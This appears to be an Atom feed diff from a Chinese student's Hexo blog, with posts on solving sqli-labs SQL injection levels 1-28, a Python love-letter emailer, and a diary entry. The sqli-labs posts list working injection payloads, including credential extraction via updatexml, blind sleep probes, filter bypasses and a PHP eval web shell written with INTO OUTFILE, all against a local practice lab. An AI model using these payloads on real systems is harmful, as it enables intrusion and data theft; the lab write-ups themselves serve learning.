@@ -1,0 +1,257 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>小七快跑</title>
+  
+  <subtitle>沈小祺技术博客</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="https://luckyjq.github.io/"/>
+  <updated>2019-06-24T04:31:41.808Z</updated>
+  <id>https://luckyjq.github.io/</id>
+  
+  <author>
+    <name>LuckyQ</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="https://luckyjq.github.io/2019/06/24/hello-world/"/>
+    <id>https://luckyjq.github.io/2019/06/24/hello-world/</id>
+    <published>2019-06-24T04:31:41.808Z</published>
+    <updated>2019-06-24T04:31:41.808Z</updated>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="https://luckyjq.github.io/2019/06/24/test1/"/>
+    <id>https://luckyjq.github.io/2019/06/24/test1/</id>
+    <published>2019-06-24T04:31:41.808Z</published>
+    <updated>2019-06-24T05:03:35.967Z</updated>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
+      
+    
+    </summary>
+    
+      <category term="test" scheme="https://luckyjq.github.io/categories/test/"/>
+    
+    
+      <category term="测试" scheme="https://luckyjq.github.io/tags/%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="标签一" scheme="https://luckyjq.github.io/tags/%E6%A0%87%E7%AD%BE%E4%B8%80/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sql注入学习,sqli-labs（23~28）全解</title>
+    <link href="https://luckyjq.github.io/2018/02/25/sqli-labs23~28/"/>
+    <id>https://luckyjq.github.io/2018/02/25/sqli-labs23~28/</id>
+    <published>2018-02-25T12:11:38.000Z</published>
+    <updated>2018-02-25T12:22:14.057Z</updated>
+    
+    <content type="html"><![CDATA[<p>sqli-labs是一个开学sql注入学习平台，很有系统性，适合初学者拿来学习练手~这里给出注入过程中的一些payload，包括task23~28的基础篇</p><a id="more"></a><h1 id="task-23-28"><a href="#task-23-28" class="headerlink" title="task 23~28"></a>task 23~28</h1><h2 id="task23"><a href="#task23" class="headerlink" title="task23"></a>task23</h2><p>屏蔽了# –注释符号，只能闭合绕过<br><a href="http://127.0.0.1/sqli-labs/Less-23/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-23/?id=1&#39;</a> and ‘1’=’1</p><h2 id="task24"><a href="#task24" class="headerlink" title="task24"></a>task24</h2><p>二次注入<br>注册一个账户 admin’# 密码admin<br>登录，然后修改密码，修改的实际上是admin的密码</p><p>问题语句</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/24.png" alt="task24" title>                </div>                <div class="image-caption">task24</div>            </figure><p>注册时候的过滤也有问题，才会导致可以写入非法字符<br>我在源代码里加了一句注册成功输出sql语句，注册成功后显示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/24.1.png" alt="task24.1" title>                </div>                <div class="image-caption">task24.1</div>            </figure><p>而实际数据库中添加的数据却是，然后修改密码时便构成了二次注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/24.2.png" alt="task24.2" title>                </div>                <div class="image-caption">task24.2</div>            </figure><h2 id="task25"><a href="#task25" class="headerlink" title="task25"></a>task25</h2><p>过滤了and和or<br>绕过一：<a href="http://127.0.0.1/sqli-labs/Less-25/?id=2&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-25/?id=2&#39;</a> aandnd 1=1 %23<br>绕过二：<a href="http://127.0.0.1/sqli-labs/Less-25/?id=2&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-25/?id=2&#39;</a> %26%26 1=1 %23<br>其中%26是&amp;的url编码</p><h2 id="task25-a"><a href="#task25-a" class="headerlink" title="task25.a"></a>task25.a</h2><p><a href="http://127.0.0.1/sqli-labs/Less-25a/?id=2" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-25a/?id=2</a> aandnd 1=1%23</p><h2 id="task26"><a href="#task26" class="headerlink" title="task26"></a>task26</h2><p>过滤了很多，and和or可以继续用&amp;&amp;和||替代<br>然后使用引号闭合，这题主要是要绕过对空格的过滤</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/26.png" alt="task26" title>                </div>                <div class="image-caption">task26</div>            </figure><p>网上有人说用%a0替换空格，试了下不行。据说是windows系统的缘故？<br>这里给出另外一种思路，利用1或者0秒的sleep时间来判断</p><p><a href="http://localhost/sqli-labs/Less-26/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-26/?id=1&#39;</a> %26%26sleep(ascii(mid(database(),1,1))=116)%26%26’1’=’1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/26.1.png" alt="task26" title>                </div>                <div class="image-caption">task26</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/26.2.png" alt="task26" title>                </div>                <div class="image-caption">task26</div>            </figure><h2 id="task26-a"><a href="#task26-a" class="headerlink" title="task26.a"></a>task26.a</h2><p>屏蔽了26的字符，还给$id加了一对括号<br><a href="http://localhost/sqli-labs/Less-26a/?id=1&#39;)%26%26sleep(ascii(mid(database(),1,1))=115)%26%26&#39;1&#39;=" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-26a/?id=1&#39;)%26%26sleep(ascii(mid(database(),1,1))=115)%26%26&#39;1&#39;=</a>(‘1</p><h2 id="task27"><a href="#task27" class="headerlink" title="task27"></a>task27</h2><p>直接用26关的payload就可以<br><a href="http://localhost/sqli-labs/Less-27/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-27/?id=1&#39;</a> %26%26sleep(ascii(mid(database(),1,1))=115) %26%26’1’=’1</p><h2 id="task27-a"><a href="#task27-a" class="headerlink" title="task27.a"></a>task27.a</h2><p>单引号变成了双引号<br><a href="http://localhost/sqli-labs/Less-27a/?id=1&quot;%26%26sleep(ascii(mid(database(),1,1))=116" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-27a/?id=1&quot;%26%26sleep(ascii(mid(database(),1,1))=116</a>) %26%26”1”=”1</p><h2 id="task28"><a href="#task28" class="headerlink" title="task28"></a>task28</h2><p>$id被单引号和括号包围，如何判断出来的？<br>?id=1’报错<br>?id=1’ and ‘1’=’1<br>?id=1”不报错</p><p><a href="http://localhost/sqli-labs/Less-28/?id=1&#39;)%26%26sleep(ascii(mid(database(),1,1))=115" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-28/?id=1&#39;)%26%26sleep(ascii(mid(database(),1,1))=115</a>) %26%26’1’=(‘1</p><h2 id="task28-a"><a href="#task28-a" class="headerlink" title="task28.a"></a>task28.a</h2><p>用28的就可以</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;sqli-labs是一个开学sql注入学习平台，很有系统性，适合初学者拿来学习练手~
+这里给出注入过程中的一些payload，包括task23~28的基础篇&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="sql注入" scheme="https://luckyjq.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="web安全" scheme="https://luckyjq.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="sqlmap" scheme="https://luckyjq.github.io/tags/sqlmap/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sql注入学习,sqli-labs基础篇（1~22）全解</title>
+    <link href="https://luckyjq.github.io/2018/02/24/sqli-labs%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
+    <id>https://luckyjq.github.io/2018/02/24/sqli-labs基础篇/</id>
+    <published>2018-02-24T12:09:38.000Z</published>
+    <updated>2018-02-24T13:12:31.663Z</updated>
+    
+    <content type="html"><![CDATA[<p>sqli-labs是一个开学sql注入学习平台，很有系统性，适合初学者拿来学习练手~这里给出注入过程中的一些payload，包括task1~22的基础篇</p><a id="more"></a><h1 id="task1-10-GET注入"><a href="#task1-10-GET注入" class="headerlink" title="task1~10 GET注入"></a>task1~10 GET注入</h1><h2 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h2><p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;</a> and 1=1 –+</p><h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><p><a href="http://127.0.0.1/sqli-labs/Less-2/?id=12232" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-2/?id=12232</a> union select 1,2,3</p><h2 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h2><p><a href="http://127.0.0.1/sqli-labs/Less-3/?id=2000&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-3/?id=2000&#39;</a>) union select 1,2,3 %23</p><h2 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h2><p><a href="http://127.0.0.1/sqli-labs/Less-4/?id=2000&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-4/?id=2000&quot;</a>) union select 1,2,3 %23</p><h2 id="task5"><a href="#task5" class="headerlink" title="task5"></a>task5</h2><p>sqlmap跑</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/5.png" alt="task5" title>                </div>                <div class="image-caption">task5</div>            </figure><h2 id="task6"><a href="#task6" class="headerlink" title="task6"></a>task6</h2><p>sqlmap跑</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/6.png" alt="task6" title>                </div>                <div class="image-caption">task6</div>            </figure><h2 id="task7"><a href="#task7" class="headerlink" title="task7"></a>task7</h2><p><a href="http://127.0.0.1/sqli-labs/Less-7/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-7/?id=1&#39;</a>)) union select 1,2,’<?php @eval($_POST["caidao"]);?>‘ into outfile ‘C:/phpstudy/PHPTutorial/WWW/muma.php’ %23</p><p>这里我的mysql设置了—secure-file-priv 关掉就可以成功了<br><a href="http://blog.csdn.net/qq_28921653/article/details/54174341" target="_blank" rel="noopener">怎么关参考这个</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/7%281%29.png" alt="task7（1）" title>                </div>                <div class="image-caption">task7（1）</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/7%282%29.png" alt="task7（2）" title>                </div>                <div class="image-caption">task7（2）</div>            </figure><h2 id="task8"><a href="#task8" class="headerlink" title="task8"></a>task8</h2><p>Sqlmap跑</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/8.png" alt="task6" title>                </div>                <div class="image-caption">task6</div>            </figure><h2 id="task9"><a href="#task9" class="headerlink" title="task9"></a>task9</h2><p>Sqlmap跑</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/9.png" alt="task6" title>                </div>                <div class="image-caption">task6</div>            </figure><h2 id="task10"><a href="#task10" class="headerlink" title="task10"></a>task10</h2><p><a href="http://127.0.0.1/sqli-labs/Less-10/?id=1&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-10/?id=1&quot;</a> and length(database())=8 and  sleep(5) %23</p><h1 id="task11-22-POST注入"><a href="#task11-22-POST注入" class="headerlink" title="task11~22 POST注入"></a>task11~22 POST注入</h1><h2 id="task11"><a href="#task11" class="headerlink" title="task11"></a>task11</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/11.png" alt="task11" title>                </div>                <div class="image-caption">task11</div>            </figure><h2 id="task12"><a href="#task12" class="headerlink" title="task12"></a>task12</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/12.png" alt="task12" title>                </div>                <div class="image-caption">task12</div>            </figure><h2 id="task13"><a href="#task13" class="headerlink" title="task13"></a>task13</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/13.png" alt="task13" title>                </div>                <div class="image-caption">task13</div>            </figure><h2 id="task14"><a href="#task14" class="headerlink" title="task14"></a>task14</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/14.png" alt="task14" title>                </div>                <div class="image-caption">task14</div>            </figure><h2 id="task15"><a href="#task15" class="headerlink" title="task15"></a>task15</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/15.png" alt="task15" title>                </div>                <div class="image-caption">task15</div>            </figure><h2 id="task16"><a href="#task16" class="headerlink" title="task16"></a>task16</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/16.png" alt="task16" title>                </div>                <div class="image-caption">task16</div>            </figure><h2 id="task17"><a href="#task17" class="headerlink" title="task17"></a>task17</h2><p>uname=admin&amp;passwd=a’ or updatexml(1,concat(0x7e,(select * from(select concat_ws(char(32,44,32),id,username,password) from users limit 0,1)biaobieming),0x7e),1) %23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/17.png" alt="task17" title>                </div>                <div class="image-caption">task17</div>            </figure><h2 id="task18"><a href="#task18" class="headerlink" title="task18"></a>task18</h2><p>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0’ or updatexml(1,concat(0x7e,database(),0x7e),1) and ‘1’=’1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/18.png" alt="task18" title>                </div>                <div class="image-caption">task18</div>            </figure><h2 id="task19"><a href="#task19" class="headerlink" title="task19"></a>task19</h2><p><a href="http://127.0.0.1/sqli-labs/Less-19/&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-19/&#39;</a> or updatexml(1,concat(0x7e,database()),1) and ‘1’=’1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/19.png" alt="task19" title>                </div>                <div class="image-caption">task19</div>            </figure><h2 id="task20"><a href="#task20" class="headerlink" title="task20"></a>task20</h2><p>uname=hahaha’ union select 1,2,3 %23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/20.png" alt="task20" title>                </div>                <div class="image-caption">task20</div>            </figure><h2 id="task21"><a href="#task21" class="headerlink" title="task21"></a>task21</h2><p>uname=JykgdW5pb24gc2VsZWN0IDEsMixlbWFpbF9pZCAgZnJvbSBlbWFpbHMj</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/21.png" alt="task21" title>                </div>                <div class="image-caption">task21</div>            </figure><h2 id="task22"><a href="#task22" class="headerlink" title="task22"></a>task22</h2><p>uname=YSIgdW5pb24gc2VsZWN0IDEsMiwzIw==</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;sqli-labs是一个开学sql注入学习平台，很有系统性，适合初学者拿来学习练手~
+这里给出注入过程中的一些payload，包括task1~22的基础篇&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="sql注入" scheme="https://luckyjq.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="web安全" scheme="https://luckyjq.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="sqlmap" scheme="https://luckyjq.github.io/tags/sqlmap/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>用python给你发520封情书</title>
+    <link href="https://luckyjq.github.io/2018/02/22/%E7%94%A8python%E7%BB%99%E4%BD%A0%E5%8F%91520%E5%B0%81%E6%83%85%E4%B9%A6/"/>
+    <id>https://luckyjq.github.io/2018/02/22/用python给你发520封情书/</id>
+    <published>2018-02-22T07:22:11.552Z</published>
+    <updated>2018-02-22T07:22:11.552Z</updated>
+    
+    <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=469699266&auto=0&height=66"></iframe><!-- <figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/2017-10.17-1.jpg" alt="喜欢你" title="">                </div>                <div class="image-caption">喜欢你</div>            </figure>{:height="50%" width="50%"} --><img src="http://oi9jazeov.bkt.clouddn.com/2017-10.17-1.jpg" width="600px"><p>哈哈，好久不见啊！最近入了python的坑，感觉很好玩<del>在网上看到一个不错的创意，用python发邮件表白，所以就有了今天这个小案例——用python给Ta发520封“我喜欢你”邮件。邮件内容包括一句言情的话、一张带有“我爱你”字样的电影截图。只要写好脚本，每天13:14分你的Ta就会自动收到这封爱的邮件哦</del>标题是“喜欢你的XXX天”~</p><a id="more"></a><p>好啦，我们开始吧。首先我们需要获取资源，从哪里去找520张电影截图和言情的文字呢？我采用的是豆瓣和句子迷这两个网站。豆瓣上有一个相册，已经有人帮你准备好了几百张截图啦<del>真的太棒了有木有，我们只要爬下图片链接下载到本地就可以了。爬取豆瓣图片的时候有坑哦，不要爬的太快了，太快了会被禁止访问的…所以我是两秒钟爬一张</del></p><p>豆瓣上的相册：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/2017-10.17-4.png" alt="豆瓣相册" title>                </div>                <div class="image-caption">豆瓣相册</div>            </figure><p>爬取图片后整理并重命名：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/2017-10.17-5.png" alt="图片整理" title>                </div>                <div class="image-caption">图片整理</div>            </figure><p>好啦，图片有了我们就可以去找文字了。我采用的是句子迷这个网站，上面有许多不错的句子，大多是名著里面的名句~在这里要注意咯，爬取句子迷上的美句时也有坑…一个ip爬几十条就会被封，所以需要多找些代理ip…</p><p>爬完句子后整理如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/2017-10.17-6.png" alt="句子整理" title>                </div>                <div class="image-caption">句子整理</div>            </figure><p>好啦，图片也有了，句子也有了，接下来只要再写一个发邮件的脚本就可以啦。菜鸟教程上有实例哦<del>我把上面的案例改一改，每天自动读取一张图片一个句子然后给加入邮件内容发送</del></p><p>电脑上收到的邮件如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/2017-10.17-7.png" alt="电脑邮件" title>                </div>                <div class="image-caption">电脑邮件</div>            </figure><p>手机qq上收到邮件：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/2017-10.17-2.jpg" alt="手机qq收到邮件" title>                </div>                <div class="image-caption">手机qq收到邮件</div>            </figure><p>emmmmmmmm…比较悲剧的是，不知道为什么，微信的邮箱收到邮件后显示不了图片…好伤心</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/2017-10.17-3.jpg" alt="手机qq收到邮件" title>                </div>                <div class="image-caption">手机qq收到邮件</div>            </figure><p>最后，利用windows的计划任务，每天定时13：14分运行脚本，你的Ta就会自动收到爱的邮件啦~</p><p>好啦，最后祝大家早日找到真爱<del>因为刚学习python脚本写的比较乱也参考了不少网上案例，等我整理好代码后发在评论区给大家参考</del></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;id=469699266&amp;auto=0&amp;height=66&quot;&gt;&lt;/iframe&gt;
+
+&lt;!-- &lt;figure class=&quot;image-bubble&quot;&gt;
+                &lt;div class=&quot;img-lightbox&quot;&gt;
+                    &lt;div class=&quot;overlay&quot;&gt;&lt;/div&gt;
+                    &lt;img src=&quot;http://oi9jazeov.bkt.clouddn.com/2017-10.17-1.jpg&quot; alt=&quot;喜欢你&quot; title=&quot;&quot;&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;image-caption&quot;&gt;喜欢你&lt;/div&gt;
+            &lt;/figure&gt;{:height=&quot;50%&quot; width=&quot;50%&quot;} --&gt;
+&lt;img src=&quot;http://oi9jazeov.bkt.clouddn.com/2017-10.17-1.jpg&quot; width=&quot;600px&quot;&gt;
+
+&lt;p&gt;哈哈，好久不见啊！最近入了python的坑，感觉很好玩&lt;del&gt;在网上看到一个不错的创意，用python发邮件表白，所以就有了今天这个小案例——用python给Ta发520封“我喜欢你”邮件。邮件内容包括一句言情的话、一张带有“我爱你”字样的电影截图。只要写好脚本，每天13:14分你的Ta就会自动收到这封爱的邮件哦&lt;/del&gt;标题是“喜欢你的XXX天”~&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="生活" scheme="https://luckyjq.github.io/tags/%E7%94%9F%E6%B4%BB/"/>
+    
+      <category term="python" scheme="https://luckyjq.github.io/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>大三生活开始</title>
+    <link href="https://luckyjq.github.io/2017/09/04/%E5%A4%A7%E4%B8%89%E7%94%9F%E6%B4%BB%E5%BC%80%E5%A7%8B/"/>
+    <id>https://luckyjq.github.io/2017/09/04/大三生活开始/</id>
+    <published>2017-09-04T14:06:45.000Z</published>
+    <updated>2018-02-22T07:22:29.686Z</updated>
+    
+    <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=490602750&auto=0&height=66"></iframe><!-- <figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/DP-170611-1.jpg" alt="一张图" title="">                </div>                <div class="image-caption">一张图</div>            </figure> --><img src="http://oi9jazeov.bkt.clouddn.com/DP-170611-1.jpg" width="600px"><p>哈哈，时间过得真快啊！（果然一开篇就是这种套话）。恩…看了一下上一篇博客竟然是上学期最后一天写的，到现在已经九个月了！！！</p><a id="more"></a><p>好吧，之间有一段时间没有弄博客，因为我觉得我理解的东西比较简单，然后我知道的知识点好像百度都可以查到，人也就懒了不想写。现在慢慢的学习才觉得基础是多么重要，你对一个知识点只有理解很透彻才可以写出好的博文，那种“感觉蛮简单的，我大概已经知道了，应该不用写吧;这个没有必要理解很透彻，等要用的时候再来看吧”的思想真是毒瘤啊，会一直欺骗自己给自己假象。好记性不如烂笔头，实践才会真的有收获。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/DP-170611-4.jpg" alt="又一张图" title>                </div>                <div class="image-caption">又一张图</div>            </figure><p>今天是大三第一天上课，也算一个新的开始吧。我觉得大三应该是转折和挑战自己的一年吧，你会开始面临很多选择。考研或者工作，是否继续在自己的专业深耕还是继续捣鼓自己感兴趣的方向。还有在学生组织的去留问题等等。其实自己现在也很迷，还没想清楚未来的路应该怎么走。但是，我很享受听歌胡乱码字的现在…恩，以后心烦的时候码字吧…等等，我这不是一个技术博客吗，快要被我的心情日志占领了…</p><p>大三继续努力吧！顺便立几个flag：</p><ul><li>尽量十一点半前睡觉</li><li>每周跑三次步</li><li>每天看点文档，写点代码</li><li>乐观向上，好好对待身边的人</li></ul><p>恩，就酱吧。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;id=490602750&amp;auto=0&amp;height=66&quot;&gt;&lt;/iframe&gt;
+
+&lt;!-- &lt;figure class=&quot;image-bubble&quot;&gt;
+                &lt;div class=&quot;img-lightbox&quot;&gt;
+                    &lt;div class=&quot;overlay&quot;&gt;&lt;/div&gt;
+                    &lt;img src=&quot;http://oi9jazeov.bkt.clouddn.com/DP-170611-1.jpg&quot; alt=&quot;一张图&quot; title=&quot;&quot;&gt;
+                &lt;/div&gt;
